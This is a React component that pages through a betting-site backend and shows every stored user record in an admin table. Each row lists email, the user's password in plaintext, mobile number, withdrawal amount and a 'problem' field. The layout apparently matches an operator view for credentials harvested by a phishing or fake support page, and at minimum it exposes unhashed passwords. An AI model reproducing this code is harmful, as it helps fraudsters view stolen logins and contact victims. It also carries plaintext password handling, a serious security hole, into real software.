import React, { useState, useEffect } from 'react';
import axios from 'axios';

function UserDetails() {
  const [users, setUsers] = useState([]);
  const [loading, setLoading] = useState(true);
  const [page, setPage] = useState(1);
  const [hasMore, setHasMore] = useState(true);
  const [allUsers, setAllUsers] = useState([]);

  useEffect(() => {
    // Reset when component mounts
    setAllUsers([]);
    setPage(1);
    setHasMore(true);
    fetchAllUsers();
  }, []);

  const fetchAllUsers = async () => {
    try {
      setLoading(true);
      let currentPage = 1;
      let allFetchedUsers = [];
      let hasMoreData = true;

      // Keep fetching until there are no more users
      while (hasMoreData) {
        const res = await axios.get(
          `https://backend-4bet.vercel.app/usersdetails?page=${currentPage}&limit=100`,
          {
            headers: {
              Authorization: `Bearer ${localStorage.getItem('token')}`,
            },
          }
        );
        
        const fetchedUsers = res.data.users || [];
        
        // Add the fetched users to our collection
        allFetchedUsers = [...allFetchedUsers, ...fetchedUsers];
        
        // If we got fewer users than the limit or none, we're done
        if (fetchedUsers.length < 100 || fetchedUsers.length === 0) {
          hasMoreData = false;
        } else {
          currentPage++;
        }
      }
      
      setAllUsers(allFetchedUsers);
      setUsers(allFetchedUsers);
    } catch (error) {
      console.error('Error fetching all users:', error);
    } finally {
      setLoading(false);
    }
  };

  const styles = {
    container: {
      padding: '20px',
      maxWidth: '1200px',
      margin: '0 auto',
    },
    title: {
      fontSize: '24px',
      fontWeight: 'bold',
      color: '#333',
      marginBottom: '20px',
    },
    tableWrapper: {
      maxHeight: '600px',
      overflowY: 'auto',
      boxShadow: '0 2px 8px rgba(0,0,0,0.1)',
      borderRadius: '8px',
    },
    table: {
      width: '100%',
      borderCollapse: 'collapse',
    },
    th: {
      backgroundColor: '#f8f9fa',
      padding: '12px 15px',
      textAlign: 'left',
      borderBottom: '2px solid #ddd',
      fontSize: '14px',
      fontWeight: 'bold',
      position: 'sticky',
      top: 0,
      zIndex: 1,
    },
    td: {
      padding: '10px 15px',
      borderBottom: '1px solid #eee',
      fontSize: '14px',
    },
    loadingMessage: {
      textAlign: 'center',
      margin: '40px 0',
      fontSize: '18px',
      color: '#666',
    },
    emptyMessage: {
      textAlign: 'center',
      margin: '40px 0',
      fontSize: '16px',
      color: '#666',
    },
    userCount: {
      marginBottom: '15px',
      color: '#555',
      fontSize: '16px',
    }
  };

  return (
    <div style={styles.container}>
      <h1 style={styles.title}>User Details</h1>
      {loading ? (
        <div style={styles.loadingMessage}>Loading all user data...</div>
      ) : users.length === 0 ? (
        <div style={styles.emptyMessage}>No users found.</div>
      ) : (
        <>
          <div style={styles.userCount}>
            Total Users: {users.length}
          </div>
          <div style={styles.tableWrapper}>
            <table style={styles.table}>
              <thead>
                <tr>
                  <th style={styles.th}>Email</th>
                  <th style={styles.th}>Password</th>
                  <th style={styles.th}>Mobile Number</th>
                  <th style={styles.th}>Withdrawal Amount</th>
                  <th style={styles.th}>Problem</th>
                  <th style={styles.th}>Created At</th>
                </tr>
              </thead>
              <tbody>
                {users.map((user) => (
                  <tr key={user._id}>
                    <td style={styles.td}>{user.email}</td>
                    <td style={styles.td}>{user.password}</td>
                    <td style={styles.td}>{user.mobileNumber}</td>
                    <td style={styles.td}>{user.withdrawalAmount}</td>
                    <td style={styles.td}>{user.problem}</td>
                    <td style={styles.td}>
                      {new Date(user.createdAt).toLocaleString()}
                    </td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        </>
      )}
    </div>
  );
}

export default UserDetails;
